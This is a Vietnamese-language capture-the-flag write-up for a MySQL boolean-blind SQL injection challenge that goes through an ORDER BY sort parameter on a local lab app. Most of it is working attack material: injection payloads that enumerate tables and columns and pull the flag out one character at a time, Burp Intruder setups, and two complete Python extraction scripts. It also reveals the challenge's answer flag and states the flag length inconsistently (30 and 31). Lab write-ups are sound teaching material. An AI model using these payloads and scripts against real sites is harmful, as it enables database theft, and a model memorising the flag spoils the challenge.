# SQLi-027: MySQL Boolean Blind via ORDER BY - Writeup

## Flag: `FLAG{0rd3r_by_bl1nd_1nj3ct10n}`

---

## 🔍 Bước 1: DETECT - Phát hiện SQLi

ORDER BY injection **không dùng quotes** mà dùng **CASE WHEN**:

### Test cơ bản

**Normal sorting:**

```
GET /products?sort=price HTTP/1.1
```

→ Sắp xếp theo giá: USB Hub ($29.99) → Gaming Laptop ($1499.99)

**TRUE condition:**

```
GET /products?sort=(CASE WHEN (1=1) THEN price ELSE name END) HTTP/1.1
```

→ Sắp xếp theo **price** (vì 1=1 là TRUE)

**FALSE condition:**

```
GET /products?sort=(CASE WHEN (1=2) THEN price ELSE name END) HTTP/1.1
```

→ Sắp xếp theo **name** (vì 1=2 là FALSE)

**Kết luận:** Thứ tự sản phẩm khác nhau → Boolean Blind SQLi confirmed! ✅

---

## 🎯 Bước 2: IDENTIFY - Xác định DBMS

**Test MySQL:**

```
GET /products?sort=(CASE WHEN (SELECT @@version LIKE '8%') THEN price ELSE name END) HTTP/1.1
```

→ Nếu sort by price → MySQL 8.x confirmed! ✅

**Alternative:**

```
GET /products?sort=(CASE WHEN (LENGTH(DATABASE())>0) THEN price ELSE name END) HTTP/1.1
```

→ MySQL-specific function

---

## 🔢 Bước 3: ENUMERATE - Liệt kê thông tin

### 3.1. Đếm số bảng

```
GET /products?sort=(CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=3 THEN price ELSE name END) HTTP/1.1
```

→ Sort by price → Có **3 bảng** ✅

### 3.2. Extract tên bảng thứ 1

**Xác định độ dài:**

```
GET /products?sort=(CASE WHEN LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1))=11 THEN price ELSE name END) HTTP/1.1
```

→ Sort by price → Bảng thứ 1 có **11 ký tự** ✅

**Extract ký tự đầu tiên:**

```
GET /products?sort=(CASE WHEN SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1),1,1)='a' THEN price ELSE name END) HTTP/1.1
```

→ Sort by price → Ký tự đầu là **'a'** ✅

**Extract ký tự thứ 2:**

```
GET /products?sort=(CASE WHEN SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1),2,1)='d' THEN price ELSE name END) HTTP/1.1
```

→ Sort by price → Ký tự thứ 2 là **'d'** ✅

**Tiếp tục cho đến hết...**
→ Kết quả: **`admin_users`**

### 3.3. Extract tên bảng thứ 2 và 3

**Bảng thứ 2 (LIMIT 1 OFFSET 1):**

```
GET /products?sort=(CASE WHEN SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET 1),1,1)='f' THEN price ELSE name END) HTTP/1.1
```

→ Kết quả: **`flags`**

**Bảng thứ 3 (LIMIT 1 OFFSET 2):**

```
GET /products?sort=(CASE WHEN SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET 2),1,1)='p' THEN price ELSE name END) HTTP/1.1
```

→ Kết quả: **`products`**

**Lưu ý:** MySQL sắp xếp bảng theo **thứ tự alphabet** → `admin_users`, `flags`, `products`

### 3.4. Liệt kê columns của bảng 'flags'

**Đếm số columns:**

```
GET /products?sort=(CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='flags')=3 THEN price ELSE name END) HTTP/1.1
```

→ Có **3 columns** (id, name, value)

**Extract tên column thứ 1:**

```
GET /products?sort=(CASE WHEN SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1),1,1)='i' THEN price ELSE name END) HTTP/1.1
```

→ Kết quả: **`id`**

**Extract tên column thứ 2:**

```
GET /products?sort=(CASE WHEN SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 1),1,1)='n' THEN price ELSE name END) HTTP/1.1
```

→ Kết quả: **`name`**

**Extract tên column thứ 3:**

```
GET /products?sort=(CASE WHEN SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 2),1,1)='v' THEN price ELSE name END) HTTP/1.1
```

→ Kết quả: **`value`**

### 3.5. Script tự động extract table names

```python
import requests

def check(condition):
    url = f"http://localhost:5027/products?sort=(CASE WHEN ({condition}) THEN price ELSE name END)"
    r = requests.get(url)
    # Check if sorted by price (TRUE) - USB Hub comes first
    return "USB Hub" in r.text.split('<div class="product">')[1]

# Extract table names
tables = []
for offset in range(3):  # 3 tables
    table_name = ""
    for pos in range(1, 20):
        found = False
        for c in "abcdefghijklmnopqrstuvwxyz_":
            cond = f"SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET {offset}),{pos},1)='{c}'"
            if check(cond):
                table_name += c
                print(f"[+] Table {offset+1}: {table_name}")
                found = True
                break
        if not found:
            break
    tables.append(table_name)

print(f"\n[+] Tables: {tables}")
# Output: ['admin_users', 'flags', 'products']
```

---

## 📤 Bước 4: EXTRACT - Trích xuất FLAG

### Method 1: Burp Intruder (Recommended for Manual Testing) 🎯

#### 4.1. Cấu hình Grep Extract

Vấn đề ORDER BY injection: **Response length không khác biệt** vì chỉ thay đổi thứ tự, không thay đổi nội dung!

**Giải pháp:** Extract tên sản phẩm đầu tiên để phân biệt TRUE/FALSE

1. **Bật Intruder** → Tab **"Options"**
2. Scroll xuống **"Grep - Extract"** → Click **"Add"**
3. **Cấu hình:**
   - Start at offset: `1977`
   - End at delimiter: `</span>`
   - Extract tên sản phẩm đầu tiên trong response

**Phân biệt TRUE/FALSE:**

- ✅ **TRUE** (sort by `rating`): Extract được **"USB Hub"** (rating thấp nhất ⭐3.9)
- ❌ **FALSE** (sort by `name`): Extract được **"4K Monitor"** hoặc tên khác (alphabetical)

#### 4.2. Xác định độ dài FLAG - Sniper Attack

**Payload:**

```http
GET /?sort=(CASE+WHEN+length((select+value+from+flags))=§30§+THEN+rating+ELSE+name+END) HTTP/1.1
Host: localhost:5027
```

**Intruder Settings:**

- **Attack type:** Sniper
- **Payload type:** Numbers (1-50)
- **Grep Extract:** Offset 1977 → `</span>`

**Kết quả:**

- Payload `30` → Grep Extract = **"USB Hub"** ✅
- Các payload khác → Grep Extract = **"4K Monitor"** hoặc tên khác ❌

→ FLAG có **30 ký tự** ✅

#### 4.3. Extract từng ký tự - Cluster Bomb Attack

**Payload:**

```http
GET /?sort=(CASE+WHEN+substr((select+value+from+flags),§1§,1)='§F§'+THEN+rating+ELSE+name+END) HTTP/1.1
Host: localhost:5027
```

**Intruder Settings:**

- **Attack type:** Cluster Bomb
- **Payload 1 (position):** Numbers 1-30
- **Payload 2 (character):** Custom list:
  ```
  F L A G { } _ 0 1 2 3 4 5 6 7 8 9
  a b c d e f g h i j k l m n o p q r s t u v w x y z
  ```
- **Grep Extract:** Offset 1977 → `</span>`

**Kết quả:**
| Position | Character | Grep Extract | Status |
|----------|-----------|--------------|--------|
| 1 | F | USB Hub | ✅ TRUE |
| 1 | L | 4K Monitor | ❌ FALSE |
| 2 | L | USB Hub | ✅ TRUE |
| 2 | A | 4K Monitor | ❌ FALSE |
| ... | ... | ... | ... |
| 30 | } | USB Hub | ✅ TRUE |

**Filter results:** Tìm các dòng có Grep Extract = **"USB Hub"** → Ghép lại được FLAG!

→ FLAG: **`FLAG{0rd3r_by_bl1nd_1nj3ct10n}`** 🎉

---

### Method 2: Python Script (Automated)

```python
import requests

def check(condition):
    url = f"http://localhost:5027/products?sort=(CASE WHEN ({condition}) THEN rating ELSE name END)"
    r = requests.get(url)
    # Check if sorted by rating (TRUE) - USB Hub comes first (lowest rating)
    return "USB Hub" in r.text.split('<div class="product">')[1]

# Step 1: Find FLAG length
print("[*] Finding FLAG length...")
for length in range(1, 50):
    if check(f"length((select value from flags))={length}"):
        print(f"✅ FLAG length = {length}\n")
        break

# Step 2: Extract FLAG character by character
print("[*] Extracting FLAG...")
flag = ""
for pos in range(1, length + 1):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        cond = f"substr((select value from flags),{pos},1)='{c}'"
        if check(cond):
            flag += c
            print(f"[+] Position {pos}: {flag}")
            break
    if c == '}':
        break

print(f"\n🎉 FLAG: {flag}")
```

---

## 🎉 Final Flag

```
FLAG{0rd3r_by_bl1nd_1nj3ct10n}
```

---

## 📝 Summary

### Workflow:

1. **DETECT** → Test `CASE WHEN (1=1) THEN price ELSE name END`
2. **IDENTIFY** → Test `@@version LIKE '8%'`
3. **ENUMERATE:**
   - Đếm bảng: `COUNT(*) FROM information_schema.tables...=3`
   - Extract tên bảng: `SUBSTR(...table_name...,pos,1)='c'`
   - Liệt kê columns: `SUBSTR(...column_name...,pos,1)='c'`
4. **EXTRACT:**
   - Xác định độ dài: `LENGTH(...)=31`
   - Extract từng ký tự: `SUBSTR(...value...,pos,1)='F'`

### ORDER BY Injection Syntax:

```sql
-- Basic structure
ORDER BY (CASE WHEN (condition) THEN column1 ELSE column2 END)

-- Examples
ORDER BY (CASE WHEN (1=1) THEN price ELSE name END)
ORDER BY (CASE WHEN (SELECT 1)=1 THEN rating ELSE price END)
```

### Phân biệt TRUE/FALSE:

| Condition | Sort Column | Thứ tự sản phẩm                               |
| --------- | ----------- | --------------------------------------------- |
| TRUE      | price       | USB Hub ($29.99) → Gaming Laptop ($1499.99)   |
| FALSE     | name        | 4K Monitor → Wireless Mouse (alphabetical)    |
| TRUE      | rating      | USB Hub (⭐3.9) → Mechanical Keyboard (⭐4.8) |

### Key Payloads:

```
// Detect
?sort=(CASE WHEN (1=1) THEN price ELSE name END)

// Count tables
?sort=(CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=3 THEN price ELSE name END)

// Extract table name (char by char)
?sort=(CASE WHEN SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1),1,1)='p' THEN price ELSE name END)

// Extract flag
?sort=(CASE WHEN SUBSTR((SELECT value FROM flags LIMIT 1),1,1)='F' THEN price ELSE name END)
```

### Important Notes:

1. **Không dùng quotes** trong ORDER BY injection
2. **Dùng CASE WHEN** để tạo conditional ordering
3. **ELSE phải là column hợp lệ** (không thể dùng `ELSE none`)
4. **Quan sát thứ tự sắp xếp** để phân biệt TRUE/FALSE
5. **MySQL functions:** `SUBSTR()`, `LENGTH()`, `DATABASE()`, `@@version`
6. **⚠️ Response Length không hoạt động** - Phải dùng Grep Extract hoặc check thứ tự sản phẩm!

### Burp Intruder Tips:

**Tại sao Response Length không work?**

- ORDER BY chỉ thay đổi **thứ tự hiển thị**, không thay đổi **nội dung response**
- Cả TRUE và FALSE đều trả về cùng số sản phẩm → **Length giống nhau**!

**Giải pháp:**

- ✅ **Grep Extract:** Offset 1977 → `</span>` (lấy tên sản phẩm đầu tiên)
- ✅ **Indicator:** "USB Hub" = TRUE, tên khác = FALSE
- ✅ **Attack type:**
  - **Sniper** cho finding length
  - **Cluster Bomb** cho extracting characters (position × character)

**Cluster Bomb Setup:**

```
Position:  §1§ → Payload: Numbers 1-30
Character: §F§ → Payload: FLAG{}_0-9a-z
```

### Common Mistakes:

❌ **SAI:**

```sql
ELSE none END  -- 'none' không phải column
count(SELECT ...)  -- Sai cú pháp
table_schema='DATABASE()'  -- Thiếu dấu ngoặc
```

✅ **ĐÚNG:**

```sql
ELSE price END  -- Dùng column thật
(SELECT COUNT(*) FROM ...)  -- Đúng cú pháp
table_schema=DATABASE()  -- Đúng function call
```
